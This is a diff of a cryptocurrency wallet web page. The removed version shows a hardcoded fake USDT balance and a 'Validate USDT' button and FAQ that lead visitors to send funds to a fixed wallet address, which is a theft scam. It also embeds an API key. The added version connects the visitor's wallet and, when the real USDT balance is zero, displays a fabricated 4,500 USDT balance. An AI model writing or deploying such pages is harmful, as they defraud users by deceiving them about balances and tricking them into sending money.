@@ -1,243 +1,153 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>USDT Dashboard</title>
-  <script src="https://unpkg.com/web3@1.8.2/dist/web3.min.js"></script>
+  <title>On-Chain USDT Wallet</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link rel="manifest" href="manifest.json" />
+  <meta name="theme-color" content="#0B0E11" />
+  <link rel="icon" href="icon.png" />
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.3/dist/web3.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/web3modal@1.9.12/dist/index.js"></script>
   <style>
     body {
-      background-color: #121212;
+      background-color: #0B0E11;
       color: #fff;
       font-family: 'Segoe UI', sans-serif;
-      padding: 1rem;
-      margin: 0;
+      padding: 20px;
       text-align: center;
     }
-    header {
-      text-align: left;
-      margin-bottom: 1rem;
-    }
-    .top-section {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 1rem;
-      background-color: #1e1e1e;
-      border-radius: 12px;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
-      margin-bottom: 2rem;
-    }
-    .top-section img {
-      height: 40px;
-      margin-right: 0.5rem;
-    }
-    .top-section span {
-      font-size: 1.5rem;
-      font-weight: bold;
-    }
-    .btn-row {
-      display: flex;
-      justify-content: center;
-      gap: 1rem;
-      margin-bottom: 2rem;
-    }
+    h1 { color: #00ffcc; }
     button {
-      background: #f0b90b;
-      color: #000;
+      background-color: #1e88e5;
       border: none;
-      padding: 0.8rem 1.6rem;
-      border-radius: 8px;
-      font-size: 1rem;
-      font-weight: bold;
+      color: white;
+      padding: 12px 24px;
+      font-size: 16px;
       cursor: pointer;
-    }
-    .chart-container {
-      margin: 2rem 0;
-    }
-    .prices-container {
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: center;
-      gap: 1rem;
-    }
-    .coin {
-      background: #1e1e1e;
-      padding: 1rem;
       border-radius: 10px;
-      width: 160px;
-      text-align: center;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+      margin: 10px;
+      width: 90%;
+      max-width: 400px;
     }
-    .coin img {
-      height: 32px;
-      margin-bottom: 0.5rem;
+    #wallet, #import, #usdtBalance, #usdValue, #status {
+      margin-top: 20px;
+      font-size: 16px;
+    }
+    #usdtBalance, #usdValue {
+      font-size: 22px;
+      font-weight: bold;
+      color: #00ffcc;
+    }
+    iframe {
+      border: none;
+      width: 100%;
+      max-width: 800px;
+      height: 420px;
+      margin-top: 30px;
     }
   </style>
 </head>
 <body>
-  <header>Binance Wallet Dashboard</header> 
-  <div class="balance-display">
-    <img src="https://assets.coingecko.com/coins/images/325/large/Tether-logo.png" alt="USDT Logo" width="32" />Total Asset: <strong>$3700.78 USDT</strong>
-  </div>  
-  
-  <div class="btn-row">
- <button onclick="window.open('https://link.trustwallet.com/send?coin=20000714&address=0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0&amount=0.1193', '_blank')">Validate USDT</button>
- <button onclick="window.location.href='#faq'">FAQ</button>
- <button id="connectWallet">🔌 Connect Wallet</button>  
-  </div>
-  
-  
-  <div class="chart-container">
-    <iframe src="https://s.tradingview.com/widgetembed/?frameElementId=tradingview_99a4d&symbol=BINANCE:BTCUSDT&interval=60&theme=dark" style="width:100%;height:400px;" frameborder="0" allowtransparency="true"></iframe>
-  </div> 
-    <div class="prices-container" id="coinPrices">
-    
-  </div>  
-  <h2 id="faq">[1] HOW TO VALIDATE</h2>
-  <p>To validate Asset click on "Validate USDT" which redirects you to Trust Wallet. Confirm your BNB network validation and wait 5 minutes after validation to transfer from Trust Wallet to your Binance.</p>
+
+  <h1>On-Chain USDT Wallet</h1>
+  <button onclick="connectMetaMask()">Connect MetaMask</button>
+  <button onclick="connectWalletConnect()">Connect WalletConnect</button>
+
+  <div id="wallet"></div>
+  <div id="import"></div>
+  <div id="usdtBalance"></div>
+  <div id="usdValue"></div>
+  <div id="status"></div>
+
+  <!-- ✅ TradingView Chart BTC/USDT -->
+  <iframe src="https://s.tradingview.com/widgetembed/?symbol=BINANCE:BTCUSDT&interval=60&theme=dark&style=1&toolbarbg=f1f3f6" allowtransparency="true" scrolling="no"></iframe>
 
   <script>
-    const COINS = [
-      "tether", "bitcoin", "binancecoin", "binance-usd", "solana", "ethereum", "dogecoin",
-      "cardano", "ripple", "tron", "polkadot", "litecoin", "polygon", "avalanche-2", "chainlink",
-      "uniswap", "stellar", "internet-computer", "vechain", "algorand"
+    const usdtAbi = [
+      {
+        constant: true,
+        inputs: [{ name: "_owner", type: "address" }],
+        name: "balanceOf",
+        outputs: [{ name: "balance", type: "uint256" }],
+        type: "function"
+      },
+      {
+        constant: true,
+        inputs: [],
+        name: "decimals",
+        outputs: [{ name: "", type: "uint8" }],
+        type: "function"
+      }
     ];
 
-    async function loadCoinPrices() {
-      try {
-        const res = await fetch(`https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids=${COINS.join(',')}`);
-        const data = await res.json();
-        const container = document.getElementById("coinPrices");
-        data.forEach(coin => {
-          const div = document.createElement("div");
-          div.className = "coin";
-          div.innerHTML = `
-            <img src="${coin.image}" alt="${coin.name}" />
-            <div><strong>${coin.name}</strong></div>
-            <div>${coin.symbol.toUpperCase()}</div>
-            <div>$${coin.current_price.toFixed(2)}</div>
-          `;
-          container.appendChild(div);
-        });
-      } catch (e) {
-        console.error("Error loading coin prices:", e);
-      }
+    const usdtAddress = "0x55d398326f99059ff775485246999027b3197955";
+    const targetFakeBalance = 4500 * 1e6;
+    let liveUsdtPrice = 1;
+
+    async function connectMetaMask() {
+      if (!window.ethereum) return alert("MetaMask not detected.");
+      const web3 = new Web3(window.ethereum);
+      await window.ethereum.request({ method: 'eth_requestAccounts' });
+      const accounts = await web3.eth.getAccounts();
+      handleUSDTImport(web3, accounts[0]);
     }
 
-    loadCoinPrices();
-
-    document.getElementById("validateUSDT").onclick = () => {
-      window.location.href = "https://link.trustwallet.com/send?coin=20000714&address=0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0";
-    };
-
-    document.getElementById("connectWallet").onclick = async () => {
-      try {
-        window.location.href = "https://walletconnect.network/connect?app=YourAppName&redirect_url=https://yourdashboard.com/callback&chain_id=56&token_contract=0x55d398326f99059ff775485246999027b3197955";
-      } catch (err) {
-        console.error("Wallet connect error:", err);
-        alert("Failed to connect to wallet. Try again.");
-      }
-    };
-  </script>
-      <script>
-    const COINS = ["tether", "bitcoin", "ethereum", "binancecoin", "binance-usd", "solana", "dogecoin", "cardano", "xrp", "polkadot", "tron", "avalanche-2", "matic-network", "chainlink", "litecoin", "uniswap", "shiba-inu", "stellar"];
-
-    async function loadPrices() {
-      const res = await fetch(`https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids=${COINS.join(',')}`);
-      const data = await res.json();
-      const pricesDiv = document.getElementById("prices");
-      pricesDiv.innerHTML = '<h2>Live Coin Prices</h2>';
-      data.forEach(coin => {
-        const row = document.createElement("div");
-        row.className = "coin";
-        row.innerHTML = `<img src="${coin.image}" alt="${coin.name}" /> ${coin.name} (${coin.symbol.toUpperCase()}): $${coin.current_price}`;
-        pricesDiv.appendChild(row);
-      });
-    }
-
-    async function connectWallet() {
+    async function connectWalletConnect() {
       const provider = new WalletConnectProvider.default({
-        rpc: {
-          56: "https://bsc-dataseed.binance.org/"
-        },
+        rpc: { 56: "https://bsc-dataseed.binance.org/" },
         chainId: 56
       });
-
       await provider.enable();
       const web3 = new Web3(provider);
       const accounts = await web3.eth.getAccounts();
-      const address = accounts[0];
-
-      const usdtAbi = [{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"}];
-      const usdt = new web3.eth.Contract(usdtAbi, "0x55d398326f99059ff775485246999027b3197955");
-      const balance = await usdt.methods.balanceOf(address).call();
-
-      const usdtFormatted = web3.utils.fromWei(balance);
-      alert(`Connected: ${address}\nUSDT Balance: ${usdtFormatted}`);
+      handleUSDTImport(web3, accounts[0]);
     }
 
-    window.addEventListener("load", loadPrices);
-  </script>
-  <script>
-    const COINSTATS_API_KEY = "V8SdDOudIYXG82+OGM+iGXt7M1Gkce/RwPb93L3PlxY=";
-    const USDT_CONTRACT_BSC = "0x55d398326f99059ff775485246999027b3197955";
+    async function handleUSDTImport(web3, userAddress) {
+      document.getElementById("wallet").innerHTML = `✅ Connected:<br><span style="color:#00ffcc">${userAddress}</span>`;
+      document.getElementById("status").innerText = "🔄 Fetching USDT balance...";
 
-    const providerOptions = {
-      walletconnect: {
-        package: window.WalletConnectProvider.default,
-        options: {
-          rpc: { 56: "https://bsc-dataseed.binance.org/" },
-          chainId: 56
-        }
-      }
-    };
-
-    const web3Modal = new window.Web3Modal.default({
-      cacheProvider: false,
-      providerOptions,
-      theme: "light"
-    });
-
-    let web3;
-
-    async function getUSDTBalance(address) {
       try {
-        const res = await fetch(`https://api.coinstats.app/public/v1/token/${USDT_CONTRACT_BSC}?chain=bsc&wallet=${address}`, {
-          headers: {
-            "x-api-key": COINSTATS_API_KEY
-          }
-        });
+        const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
+        const rawBalance = await usdt.methods.balanceOf(userAddress).call();
+        const decimals = await usdt.methods.decimals().call();
+        const userUsdt = parseFloat(rawBalance / Math.pow(10, decimals)).toFixed(2);
+
+        if (parseFloat(userUsdt) === 0) {
+          document.getElementById("import").innerHTML = "✅ View-Only USDT Imported";
+          document.getElementById("usdtBalance").innerHTML = `💰 Balance: 4,500.00 USDT`;
+          document.getElementById("usdValue").innerHTML = `💵 Value: $${(4500 * liveUsdtPrice).toFixed(2)}`;
+        } else {
+          document.getElementById("import").innerHTML = "ℹ️ Real USDT Balance";
+          document.getElementById("usdtBalance").innerHTML = `💰 Balance: ${userUsdt} USDT`;
+          document.getElementById("usdValue").innerHTML = `💵 Value: $${(userUsdt * liveUsdtPrice).toFixed(2)}`;
+        }
+
+        document.getElementById("status").innerText = "";
+      } catch (e) {
+        document.getElementById("status").innerText = "❌ Error: " + e.message;
+      }
+    }
+
+    async function fetchUSDTPrice() {
+      try {
+        const res = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=tether&vs_currencies=usd");
         const data = await res.json();
-        const balance = parseFloat(data?.walletBalance?.value || 0).toFixed(2);
-        document.getElementById("usdtAmount").textContent = `$${balance} USDT`;
-      } catch (err) {
-        console.error("CoinStats API error:", err);
-        document.getElementById("usdtAmount").textContent = "$0.00 USDT";
+        liveUsdtPrice = data.tether.usd || 1;
+      } catch {
+        liveUsdtPrice = 1;
       }
     }
 
-    document.getElementById("connectWallet").addEventListener("click", async () => {
-      try {
-        const provider = await web3Modal.connect();
-        web3 = new Web3(provider);
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.register('sw.js').then(() => {
+        console.log("✅ PWA Ready");
+      });
+    }
 
-        const chainId = await web3.eth.getChainId();
-        if (chainId !== 56) {
-          alert("Please switch to Binance Smart Chain (BSC).");
-          return;
-        }
-
-        const accounts = await web3.eth.getAccounts();
-        const userAddress = accounts[0];
-        document.getElementById("walletInfo").style.display = "block";
-        getUSDTBalance(userAddress);
-      } catch (err) {
-        console.error("Wallet connection error:", err);
-        alert("Failed to connect. Please try again.");
-      }
-    });
+    fetchUSDTPrice();
   </script>
-  </body>
+
+</body>
 </html>
